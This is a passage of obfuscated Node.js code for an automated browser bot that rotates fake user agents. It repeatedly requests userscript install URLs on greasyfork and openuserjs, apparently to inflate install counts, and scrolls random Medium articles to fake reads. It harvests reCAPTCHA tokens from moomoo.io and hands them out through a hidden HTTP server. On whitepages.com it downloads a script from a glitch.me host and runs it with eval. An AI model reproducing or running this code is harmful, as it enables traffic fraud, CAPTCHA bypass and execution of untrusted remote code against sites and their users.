      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': X(0x1b) + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + X(0x3) + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + X(0xa) + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + X(0x19) + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + V(0xc) + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    V(0x5) + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + X(0x1a) + 'ntrepreneu' + 'r-s-handbo' + W(0xe, 'TyWd') + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    V(0x5) + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + X(0x6) + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x73f + -0x40 * -0x92 + 0x1 * -0x2bbf
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x1 * -0x1fa2 + 0x3 * -0x2dd + -0x2839 * -0x1)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0x1c37 + 0x12f4 + 0x9a7), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0x18f8 + -0x944 * -0x1 + 0x203 * 0x8), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0xc * -0x36 + -0x7 * 0x31d + -0x1853 * -0x1;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0x58a + 0x1044 + -0x15ce; w < getRandomInt(0x6c4 * -0x3 + -0x269c + 0x3ae9, -0x1e0e + 0x2126 + -0x313); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0x10bb6 + -0xd64e + 0x2cc64);
        }
      }();
    }, 0x1 * 0xae5 + -0x5c * -0x38 + -0x1ea1 * 0x1), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0x47b * 0x1 + -0x127 + -0xd5 * 0x4;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0x18e5 + -0x67a * -0x1 + -0x1f5f, -0x1967 + 0x130c * -0x1 + 0x2ca5)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x5ea7 + 0x136d + 0x2 * 0x18e);
    }, 0xc45 + -0x4 * -0x8a8 + -0x2e81), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0x1de * 0xf + -0x25de + 0x41e0;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x236b * 0x1 + 0x17c9 + 0x175a), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x212f + 0xe * 0x147 + 0xf4d * 0x1), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0x1 * 0xe5298 + 0xb5595 + 0x1 * 0x10b8a3);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0x152 * 0x2 + 0x6 * -0x2ab + 0xdc2);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const Y = c,
      i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x4d3 + -0xeb5 * 0x1 + 0x6 * 0x1c7);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g[Y(0x21)](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x20dd + 0x2b46 + 0x70d * 0x3);
}
doFlags['doOUJS'] && ((async () => {
  const a2 = d,
    a1 = c,
    a0 = b;
  async function f() {
    const Z = c,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + Z(0x14),
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0x7ba * 0x1 + -0x1812 + 0x117 * 0xf) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0x3 * 0x119 + 0x2629 + 0x83 * -0x51));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x10de + -0x2 * 0x72d + 0x6c * 0x4a, D['indexOf']('\x20'));
        return B ? E['slice'](0x949 * -0x3 + 0x6a1 + 0x1a2 * 0xd, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x1056 + 0x2fce + 0x798),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0x7b2 * -0x9 + -0x467f + -0xb2d1 * -0x1),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': Z(0x7) + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + a0(0x18, '%^w*') + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + a1(0x4) + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + a0(0x1c, 'qd[d') + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + a2(0x22),
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0x1 * -0x4a + -0x1 * 0x20ee + 0x2 * 0x1052; k < 0x1e91 + 0xc9c + -0x2b29; k++)
    setTimeout(f, (-0x15e72 + -0x1db1 * 0xe + 0x3e880) * k * getRandomInt(0xe * -0x2 + -0x2265 + 0x2282, 0x22cb * -0x1 + -0x479 * 0x6 + 0x3da4));
  setInterval(() => {
    f();
    for (let l = -0xb90 + 0x43 * -0x6a + 0x274e; l < 0x1f * -0x74 + 0x23ef + -0x15df; l++)
      setTimeout(f, (-0x654 * 0x13 + -0x1c597 * 0x1 + 0x32833) * l * getRandomInt(-0xfb8 + 0x234d + 0xb3 * -0x1c, -0x1e2f * 0x1 + 0x1 * -0x267b + 0x44ad));
  }, -0x1 * -0x669d52 + 0x16 * 0x4c6d1 + -0x98c4c8);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
